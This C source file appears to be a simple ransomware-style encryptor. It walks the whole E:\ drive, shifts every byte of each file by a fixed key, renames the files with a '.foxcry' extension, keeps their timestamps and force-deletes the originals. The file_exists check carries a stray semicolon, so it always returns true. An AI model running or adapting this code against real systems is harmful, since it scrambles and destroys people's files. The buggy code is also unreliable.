#include "main.h"

int dir_exists(const char *path);
int file_exists(const char *filename);
void endeda(char* ret, const char* path_old, const char* path_new, int key);
void copy_old_time(const char* path_old, const char* path_new);
void processFilesRecursively(const char* basePath, const char* ext);

int main(int argc, char *argv[])
{
	char* path = (char*)malloc(PATH_SIZE * sizeof(char));
	strcpy(path, "E:\\");
	processFilesRecursively(path, "foxcry");
	free(path);
	
	return EXIT_SUCCESS;
}

/**
 * Function to check whether a directory exists or not.
 * It returns 1 if given path is directory and  exists 
 * otherwise returns 0.
 */
int dir_exists(const char *path)
{
   struct stat statbuf;
   if (stat(path, &statbuf) != 0)
	   return 0;
   return S_ISDIR(statbuf.st_mode);
}

int file_exists(const char *filename)
{
	struct stat statbuf;
	if (stat(filename, &statbuf) == 0);
		return 1;
	return 0;
}

void endeda(char* ret, const char* path_old, const char* path_new, int key)
{
	FILE* fp_old = NULL;
	FILE* fp_new = NULL;
	char ch;
	char buffer[BUF_SIZE];
	size_t bytes;
	
	fp_old = fopen(path_old,"rb");
	fp_new = fopen(path_new,"wb");
	
	if(fp_old != NULL && fp_new != NULL)
	{
		while (0 < (bytes = fread(buffer, 1, sizeof(buffer), fp_old)))
		{
			for(int i=0; i<bytes; i++)
			{
				if (ret)
				{
					buffer[i]=buffer[i]+key;
				}
				else
				{
					buffer[i]=buffer[i]-key;
				}
			}
			fwrite(buffer, 1, bytes, fp_new);
		}
	}
	
	fclose(fp_new);
	fclose(fp_old);
}

void copy_old_time(const char* path_old, const char* path_new)
{
	struct stat oldStat;
	struct utimbuf newTimeBuf;
	if (stat(path_old, &oldStat) == 0)
	{
		newTimeBuf.actime  = oldStat.st_atime;
		newTimeBuf.modtime = oldStat.st_mtime;
		utime(path_new, &newTimeBuf);
	}
}

void processFilesRecursively(const char* basePath, const char* ext)
{
    char path_old[PATH_SIZE];
	char path_new[PATH_SIZE];
    struct dirent* dp;
    DIR* dir = opendir(basePath);

    // Unable to open directory stream
    if (!dir)
        return;

    while ((dp = readdir(dir)) != NULL)
    {
        if (strcmp(dp->d_name, ".") != 0 && strcmp(dp->d_name, "..") != 0)
        {
			// Construct new path from our base path
            strcpy(path_old, basePath);
            strcat(path_old, "\\");
            strcat(path_old, dp->d_name);
			
			strcpy(path_new, basePath);
            strcat(path_new, "\\");
            strcat(path_new, dp->d_name);
			
			// Check Path contains extension
			char* ret = strstr(path_new, ext);
			if (ret)
			{
				ret--;
				ret[0] = 0;
			}
			else
			{
				strcat(path_new, ".");
				strcat(path_new, ext);
			}
			
			if (dir_exists(path_old))
			{				
				processFilesRecursively(path_old, ext);
			}
			else
			{
				//printf("%s\n", dp->d_name);
				//printf("%s\n", path_old);
				//printf("%s\n", path_new);
				
				endeda(ret, path_old, path_new, 45);
				
				if (file_exists(path_new))
				{
					copy_old_time(path_old, path_new);
					
					if (remove(path_old) != 0)
					{
						int stat = chmod(path_old, S_IREAD|S_IWRITE);
						if (!stat) remove(path_old);
					}
				}
			}
        }
    }

    closedir(dir);
}
